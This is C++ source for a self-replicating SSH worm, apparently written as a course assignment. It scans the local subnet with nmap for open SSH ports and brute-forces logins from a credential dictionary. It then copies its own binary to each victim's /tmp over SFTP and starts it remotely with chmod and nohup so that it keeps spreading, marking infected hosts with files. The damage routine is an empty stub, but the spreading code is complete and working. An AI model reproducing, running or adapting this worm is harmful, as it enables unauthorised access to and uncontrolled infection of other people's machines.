/*******************************************************************************
 * Filename: replicator_worm.cpp
 * Description:  A simple SSH worm that will spread to one machine at a time
 * Required:  sudo apt-get install libssh-dev
 *            sudo apt-get install nmap  (if not already exists)
 ******************************************************************************/
#include "worm_support.h"
#include <sys/types.h>
#include <sys/wait.h>   // wait() system call
#include <sys/stat.h>
#include <stdio.h>
#include <unistd.h>     // fork() system call
#include <stdlib.h>     // exit() system call
#include <ifaddrs.h>    // To get the interface addresses
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <string>
#include <vector>
#include <libssh/libssh.h>  // ssh library
#include <libssh/sftp.h>  // sftp module
#include <fcntl.h>
#include <libgen.h>
#include <limits.h>

/*******************************************************************************
 * Define sections
 ******************************************************************************/

/*******************************************************************************
 * Public variables
 ******************************************************************************/
using namespace std;

/*******************************************************************************
 * Function definitions
 ******************************************************************************/

/*******************************************************************************
 * Function: isFileExist
 * @param inFile string contain the name of the file to check
 * @return a boolean of true if exist or false if not
 ******************************************************************************/
bool isFileExist(const string inFile) {
    struct stat fileBuff;
    if ( stat(inFile.c_str(), &fileBuff) != 0) {
        return false;
    }
    return true;
}

/*******************************************************************************
 * Function: isRemoteFileExist
 * @param inFile string contain the name of the file to check
 * @param sshClient an active ssh session to a remote system
 * @return a boolean of true if exist or false if not
 ******************************************************************************/
bool isRemoteFileExist(ssh_session &sshClient, const string inFile) {

    // The return code
    int rc;

    // The fileAttributes
    sftp_attributes fileStat;

    // Create a sftp session
    sftp_session sftp = sftp_new(sshClient);
    if (sftp == NULL) {
        perror("isRemoteFileExist: Unable to create sftp session\n");
        return false;
    }

    // Initialize the sftp session
    rc = sftp_init(sftp);
    if (rc != SSH_OK) {
        // Free the memory for the sftp structure
        sftp_free(sftp);
        perror("isRemoteFileExist: Unable to initialize sftp session\n");
        return false;
    }

    // Try to stat the file
    fileStat = sftp_stat(sftp, inFile.c_str());
    if (fileStat == NULL) {
        // If fileStat is NULL it means the file doesn't exist
        sftp_free(sftp);
        return false;
    }

    // Release the sftp session
    sftp_free(sftp);
    return true;
}

/*******************************************************************************
 * Function: isLocalSystemInfected
 * @param N/A
 * @return a boolean of true if infected or marked as master or false if not
 ******************************************************************************/
bool isLocalSystemInfected() {
    return ( isFileExist(SELF_MARKER_FILE) || isFileExist(REPLICATOR_MARKER_FILE));
}

/*******************************************************************************
 * Function: isRemoteSystemInfected
 * @param sshClient
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
bool isRemoteSystemInfected(ssh_session &sshClient) {
    return (isRemoteFileExist(sshClient, SELF_MARKER_FILE) ||
            isRemoteFileExist(sshClient, REPLICATOR_MARKER_FILE));
}

/*******************************************************************************
 * Function: markSystem
 * @param inFile a string contain the file name
 * @param message a string contains the IP from where the attacker is
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
void markSystem(string inFile, string message) {
    string msg = message;

    // Open the file and write the message to it
    FILE* fp = fopen(inFile.c_str(), "w");
    if (!fp) {
        perror("markSystem: fopen failed\n");
        exit(-1);
    }
    // Write the message into it
    if (fwrite(msg.c_str(), sizeof(char), msg.length(), fp) < 0 ) {
        perror("markSystem: fwrite failed\n");
        exit(-1);
    }

    // Close the file
    fclose(fp);
}

/*******************************************************************************
 * Function: markSystemAsInfected
 * @param inFile a string contain the file name
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
void markSystemAsInfected(const string fromHost = "") {
    string msg = "";
    if (fromHost.length() > 0) {
        msg += "Infected from " + fromHost;
    } else {
        msg += "I got infected boo hooo";
    }
    // Mark the system
    markSystem(REPLICATOR_MARKER_FILE, msg);

}

/*******************************************************************************
 * Function: markSystemAsInfected
 * @param inFile a string contain the file name
 * @return a boolean of true if remote system infected or false if not
 ******************************************************************************/
void markSystemAsMaster() {
    string msg = "I am the master";
    // Mark the system
    markSystem(SELF_MARKER_FILE, msg);
}

/*******************************************************************************
 * Function: getCIDR
 * @param myIF a pointer to a Iface struct that contain the IP/NetMask
 * @return a string contain the CIDR format
 ******************************************************************************/
string getCIDR(unsigned int IP, unsigned int Mask) {
    string cidr;
    // We first masked the rawIP to get the network address and stored it in
    // in_addr format so that we can use inet_ntoa later
    in_addr networkIP;
    networkIP.s_addr = IP & Mask;

    // Find number of bits used by the network mask by shifting 1 bit
    // at a time until we reach zero.
    unsigned int count = 0;
    while (Mask > 0) {
        Mask = Mask >> 1;
        count++;
    }

    // Convert the count value to string
    char buff[10];
    sprintf(buff, "%u",count);

    // Build the CIDR string
    cidr = inet_ntoa(networkIP);
    cidr += "/";
    cidr += buff;

    return cidr;
}

/*******************************************************************************
 * Function: getMyActiveIP
 * @param N/A
 * @return a Iface struct that has the IP, Mask, and CIDR
 ******************************************************************************/
Iface getMyActiveIP() {
    Iface host;
    ifaddrs *ifAddresses, *ifa;

    // Retrieves all Internet Interfaces.  Create a link list of ifAddresses
    if (getifaddrs(&ifAddresses) < 0) {
        perror("getMyActiveIP failed getifaddrs\n");
        exit(-1);
    }

    // We will use the pointer ifa to iterate through the addresses
    ifa = ifAddresses;

    while (ifa) {
        // We do not want to deal with the "lo" name.
        if ( strcmp(ifa->ifa_name, "lo") != 0 ) {
            // We retrieve the address and the netmask into the struct
            // sockaddr_in (for IPV4)
            sockaddr_in *address = (sockaddr_in *) ifa->ifa_addr;
            sockaddr_in *netmask = (sockaddr_in *) ifa->ifa_netmask;

            if (address->sin_family == AF_INET) {
                // We get the ip and netmask
                host.ip = inet_ntoa(address->sin_addr);
                host.mask = inet_ntoa(netmask->sin_addr);

                // Call getCIDR to build CIDR from IP and NetMask
                host.cidr = getCIDR(address->sin_addr.s_addr, netmask->sin_addr.s_addr);
                break;
            }
        }

        // we advance to the next one
        ifa = ifa->ifa_next;
    }

    ifa = NULL;
    // Free the memory
    freeifaddrs(ifAddresses);

    // Return the host
    return host;

}

/*******************************************************************************
 * Function: getHostsOnTheSameNetwork
 * @param host A Iface struct contains information about the system
 *              such as ip, mask, cidr
 * @return a list of IP addresses of hosts that have SSH port open
 ******************************************************************************/
vector<string> getHostsOnTheSameNetwork(const Iface host) {

    string nmapFile = "/tmp/nmap.txt";
    char NMAP[] = "/usr/bin/nmap";
    struct stat fileBuff;

    if ( stat(NMAP, &fileBuff) != 0) {
        perror("getHostsOnTheSameNetwork: cannot find /usr/bin/nmap\n");
        exit(-1);
    }

    // We will fork a child and use it to run nmap
    // Expected that the nmap program is available on the system
    pid_t pid = fork();

    if (pid < 0) {
        perror("getHostsOnTheSameNetwork failed to fork\n");
        exit(-1);
    } else if (pid == 0) {
        // I'm the child process
        printf("Scanning the network...\n");

        // We want to silence the output of nmap.
        // close both STDOUT and STDERR
        close(1);
        close(2);
        // Run nmap program against the CIDR string for:
        // port 22 with open status
        // output in greppable format in a file called /tmp/nmap.txt
        if (execlp(NMAP, "nmap", host.cidr.c_str(), "-p 22", "--open", "-oG", nmapFile.c_str(), NULL) < 0) {
            perror("getHostsOnTheSameNetwork: execlp failed child");
            exit(-1);
        };
        printf("Should not be possible to get to here !!!!");
        exit(-1);

    } else {
        // Parent process wait for child to complete
        wait(NULL);
        // Child return, we should have access to the file to process it
        vector<string> allHosts;

        // Check to make sure that nmap generate a file
        if (isFileExist(nmapFile)) {

            // We need to parse the nmapFile
            FILE* fp = fopen(nmapFile.c_str(), "r");
            if (!fp) {
                perror("getHostsOnTheSameNetwork: Error open nmapfile\n");
                exit(-1);
            }

            // Now read through all the file content
            while( !feof(fp) ) {
                char buff[1024];
                // Read the data line by line
                if (fgets(buff, sizeof(buff), fp)) {

                    // We want to only get the line that say 22/open/tcp
                    // and is not the same IP as the host
                    if (strstr( buff, "22/open/tcp" ) &&
                        ! strstr( buff, host.ip.c_str() ) ) {
                        // Parse the string by space.  We ignore the first token
                        char *token = strtok(buff, " ");
                        // We want the 2nd token which is the IP
                        token = strtok(NULL, " ");

                        // Add the IP to the list
                        allHosts.push_back(token);
                    }
                }
            }

            // Close the file
            fclose(fp);

            // Remove the temp nmap file
            if (remove(nmapFile.c_str()) == -1) {
                fprintf(stderr, "WARNING: unable to remove %s\n", nmapFile.c_str());
            }

        } else {
            perror ("getHostsOnTheSameNetwork: nmap did not generated file!!!\n");
        }

        // Return allHosts
        return allHosts;
    }
}

/*******************************************************************************
 * Function: sshVerifyKnownHost
 * The code was from the examples of libssh
 * @param sshClient is a ssh_session
 * @return 0 for success or -1 for fail
 ******************************************************************************/
int sshVerifyKnownHost(ssh_session sshClient) {
    // Successfully connect to server.  Accept connection
    // and write the knownhost file
    bool goodHost = false;
    int state;

    // Check known host
    state = ssh_is_server_known(sshClient);

    switch(state) {
        case SSH_SERVER_KNOWN_OK:
            printf("Server known OK \n");
            goodHost = true;
            break;
        case SSH_SERVER_KNOWN_CHANGED:
            printf("Server known changed \n");
            goodHost = false;
            break;
        case SSH_SERVER_FOUND_OTHER:
            printf("Server found other\n");
            goodHost = false;
            break;
        case SSH_SERVER_FILE_NOT_FOUND:
        case SSH_SERVER_NOT_KNOWN:
            printf("Writing file....");
            if (ssh_write_knownhost(sshClient) < 0) {
                printf("FAILED\n");
                goodHost = false;
            } else {
                printf("GOOD\n");
                goodHost = true;
            }
            break;
        case SSH_SERVER_ERROR:
            printf("Server Error %s \n", ssh_get_error(sshClient));
            goodHost = false;
    } // End switch state

    // Clear the hash value
    if (goodHost) {
        return 0;
    } else {
        return 1;
    }
}

/*******************************************************************************
 * Function: tryCredential
 * @param sshClient a ssh_session
 * @param host a string contains the IP of the victim host
 * @param cred a Credential structs contains user/pass
 * @return 0 if good, -1 if failed
 ******************************************************************************/
int tryCredential(ssh_session &sshClient, const string host, const Credential cred) {

    // Initialize the sshClient
    //ssh_session sshClient;
    unsigned int port = 22;
    bool success = false;
    const char *user = cred.userName.c_str();
    const char *pass = cred.password.c_str();

    sshClient = ssh_new();
    if (sshClient == NULL) {
        perror("tryCredential: unable to initialize sshClient\n");
        return -1;
    }

    // Set the host
    if (ssh_options_set(sshClient, SSH_OPTIONS_HOST, host.c_str()) < 0) {
        perror("tryCredential: unable to set host\n");
        ssh_free(sshClient);
        return -1;
    }

    // Set the port
    if (ssh_options_set(sshClient, SSH_OPTIONS_PORT, &port) < 0) {
        perror("tryCredential: unable to set port\n");
        ssh_free(sshClient);
        return -1;
    }

    // Set the user
    if (ssh_options_set(sshClient, SSH_OPTIONS_USER, user) < 0) {
        perror("tryCredential: unable to set user\n");
        ssh_free(sshClient);
        return -1;
    }

    printf("Connecting host: %s with %s/%s...\n", host.c_str(), user, pass);

    // Connect to server
    if (ssh_connect(sshClient) != SSH_OK) {
        printf("tryCredential: Error connect to host %s\n", ssh_get_error(sshClient));
        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        return -1;
    }

    // Check for known hosts
    if (sshVerifyKnownHost(sshClient) < 0) {
        perror("tryCredential: Failed verify known host\n");
        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        return -1;
    }

    // Try to authenticate with password
    int ReturnCode = ssh_userauth_password(sshClient, NULL, pass);

    if (ReturnCode == SSH_AUTH_ERROR) {
        printf("tryCredential: Something wrong. %s\n", ssh_get_error(sshClient));
    } else if (ReturnCode == SSH_AUTH_DENIED) {
        printf("Invalid Credential.  Denied\n");
        success = false;
    } else if (ReturnCode == SSH_AUTH_SUCCESS) {
        printf("Good Credential. Logged In\n");
        success = true;
    }

    // See whether we have a success valid sshClient
    if (success) {
        return 0;
    } else {
        // We couldn't get a valid session.  Free it and return NULL
        ssh_disconnect(sshClient);
        ssh_free(sshClient);
        return -1;
    }

}

/*******************************************************************************
 * Function: attackSystem
 * @param host a string contains the IP of the victim host
 * @return a valid active ssh_session or NULL if not
 ******************************************************************************/
ssh_session attackSystem(const string host) {
    ssh_session sshClient;

    printf("Attacking host: %s ...\n", host.c_str());
    for (int i = 0; i < DICTIONARY_SIZE; i++) {
        // Retrieve the credential from dictionary
        Credential cred = DICTIONARY[i];

        // Try the credential against the host.  If successful, sshClient
        // will be set to a connected session
        if (tryCredential(sshClient, host, cred) == 0) {
            return sshClient;
        }
    }

    return NULL;
}

/*******************************************************************************
 * Function: sftpFile
 * @param sshClient an active ssh session
 * @param source is a string contain the path to the source file
 * @param target is a string contain the path of the target file
 * @return 0 if success or -1 if fail
 ******************************************************************************/
int sftpFile(ssh_session &sshClient, char *source, char *target) {

    // The return code
    int rc;

    // The structure for the remote file
    sftp_file remoteFile;

    // We want to Open the file to Write Only, and Truncate if already exist
    int access_type = O_WRONLY | O_CREAT | O_TRUNC;

    printf("Source file: %s\n", source);
    printf("Target file: %s\n", target);

    // Create a sftp session
    sftp_session sftp = sftp_new(sshClient);

    if (sftp == NULL) {
        perror("sftpFile: Unable to create sftp session\n");
        return -1;
    }

    // Initialize the sftp session
    rc = sftp_init(sftp);
    if (rc != SSH_OK) {
        // Free the memory for the sftp structure
        sftp_free(sftp);
        perror("sftpFile: Unable to initialize sftp session\n");
        return -1;
    }

    // Open the worm file for reading
    FILE* localFile = fopen(source, "r");
    if (!localFile) {
        perror("sftpFile: Unable to open source file with fopen\n");
        return -1;
    }

    // Open the remote file for writing
    remoteFile = sftp_open(sftp, target, access_type, S_IRWXU);
    if (remoteFile == NULL) {
        perror("sftpFile: Unable to open remote file for writing\n");
        return -1;
    }

    // Write the data from source to target
    char buffer[1024];
    int readByte, writeByte;
    while (!feof(localFile)) {
        if ( (readByte = fread(buffer, sizeof(char), 1024, localFile)) < 0 ) {
            perror("sftpFile: Error reading local file\n");
            return -1;
        }
        writeByte = sftp_write(remoteFile, buffer, readByte);
        if (writeByte != readByte) {
            perror("sftpFile: Error writing to remote file\n");
            return -1;
        }
    }

    // Once we get here we finished writing the file, close it
    fclose(localFile);

    // Close remote file
    rc = sftp_close(remoteFile);
    if (rc != SSH_OK)
    {
        perror("sftpFile: Unable to close remote file\n");
        return -1;
    }

    // Release the sftp session
    sftp_free(sftp);
    return 0;
}

/*******************************************************************************
 * Function: remoteExecute
 * @param sshClient an active ssh session
 * @param cmd is a string contain the command to execute remotely
 * @return 0 if success or -1 if fail
 ******************************************************************************/
int remoteExecute(ssh_session &sshClient, char *cmd) {

    // Setup a channel
    ssh_channel ssh;
    int rc;

    // Create a channel
    ssh = ssh_channel_new(sshClient);
    if (ssh == NULL) {
        perror("remoteExecute: Unable to create channel\n");
        return -1;
    }

    // Open the channel
    rc = ssh_channel_open_session(ssh);
    if (rc != SSH_OK) {
        perror("remoteExecute: Unable to open the channel\n");
        ssh_channel_free(ssh);
        return -1;
    }

    // Execute the command
    rc = ssh_channel_request_exec(ssh, cmd);
    if (rc != SSH_OK) {
        perror("remoteExecute: Unable to execute command\n");
        ssh_channel_close(ssh);
        ssh_channel_free(ssh);
        return -1;
    }

    // if we get here it means the command execute successfully
    // We will close the channel and free before return
    ssh_channel_close(ssh);
    ssh_channel_free(ssh);
    return 0;

}

/*******************************************************************************
 * Function: spreadAndExecute
 * @param sshClient an active ssh session
 * @param fromHost a string contains the IP of the attacker
 *                 this is mainly for identify purpose for the assignment
 * @return 0 if success or -1 if fail
 ******************************************************************************/
int spreadAndExecute(ssh_session &sshClient, const string fromHost) {
    // Determine the worm location and its base name
    char sourceName[PATH_MAX] = {0};
    char destName[PATH_MAX] = {0};
    char command[1024] = {0};

    // Determine the full path of the worm file
    if (readlink("/proc/self/exe", sourceName, PATH_MAX) == -1) {
        perror("spreadAndExecute: problem with readlink\n");
        return -1;
    }

    // Build out the worm destination path and name
    sprintf(destName, "/tmp/%s", basename(sourceName));

    // Spread the file
    if (sftpFile(sshClient, sourceName, destName) != 0) {
        perror("spreadAndExecute: not able to spread worm\n");
        return -1;
    }

    // We want to allow read/execute to file for all chmod a+rx
    sprintf(command, "chmod a+rx %s", destName);
    if (remoteExecute(sshClient, command) != 0) {
        perror("spreadAndExecute: failed chmod the worm\n");
        return -1;
    }

    // Now we tell it to execute
    sprintf(command, "nohup %s %s >/tmp/nohup.out 2>&1 &", destName, fromHost.c_str());
    if (remoteExecute(sshClient, command) != 0) {
        perror("spreadAndExecute: failed execute the worm\n");
        return -1;
    }

    return 0;
}

/*******************************************************************************
 * Function: performMalicious
 * @param N/A
 * @return 0 if success or -1 if fail
 ******************************************************************************/
int performMalicious() {
    return 0;
}

/*******************************************************************************
 * Main program
 * Program accept command line arguments
 ******************************************************************************/
int main (int argc, const char **argv) {
    Iface thisHost;
    vector<string> allHosts;

    // Check to see if run from master/hacker PC
    // argc start at 1 and going up
    if(argc < 2)
    {
        // If the Local System has not been mark as master, mark it
        if (! isLocalSystemInfected() ) {
            printf("Marking system as hacker system\n");
            // Mark the system as master
            markSystemAsMaster();
        }
        printf("Running on the hacker system...\n");
    } else {
        printf("We are on the victim system ... let's do some damage \n");
        if ( isLocalSystemInfected() ) {
            // System already infected
            printf("System already infected.  Quit\n");
            exit(0);
        } else {
            string fromHost = argv[1];
            printf("We won't be doing anything for this one\n");
            // Perform malicious
            performMalicious();
            printf("Marked system as infected\n");
            // Mark the system
            markSystemAsInfected(fromHost);
        }
    }

    // Get the IP address of this system
    thisHost = getMyActiveIP();

    // Get all the hosts from the network
    allHosts = getHostsOnTheSameNetwork(thisHost);

    // Print out the current host network info
    printf("Host IP: %s Mask: %s CIDR: %s\n", thisHost.ip.c_str(),
                      thisHost.mask.c_str(), thisHost.cidr.c_str());

    // Print out the list of all the the hosts found from scanning
    printf("Found the following hosts:\n");
    for (int i = 0; i < allHosts.size(); i++) {
        printf("Host: %s\n", allHosts[i].c_str());
    }

    // Loop through to attack the system
    for (int i = 0; i < allHosts.size(); i++) {
        string host = allHosts[i];
        ssh_session sshClient;

        printf ("\n");
        // Attempt to attack the host
        sshClient = attackSystem(host);

        if (sshClient == NULL) {
            printf("Unsuccessfully attack host %s.  Move to next one.\n", host.c_str());
            continue;
        }

        // If we get here, it means that we have a good sshClient

        if (! isRemoteSystemInfected(sshClient)) {
            printf("Host %s has not been infected yet, spread it...\n", host.c_str());
            // The remote system has not been infected yet.
            // We will spread it
            if (spreadAndExecute(sshClient, thisHost.ip) != 0) {
                perror("Failed to spread and execute\n");
            } else {
                printf("Successfully spread and execute\n");
            };

            // Close the sshClient
            ssh_disconnect(sshClient);
            ssh_free(sshClient);
            // Since we want to spread from A to B.  Then B to C
            break;

        } else {
            // The remote system has been infected.  Skip to next one
            printf("Remote host %s already infected.  Skip\n", host.c_str());
            continue;
        }

    }  // End for loop of all Hosts

    printf("All Done with attacking\n");
    // All Done here
    return 0;

}
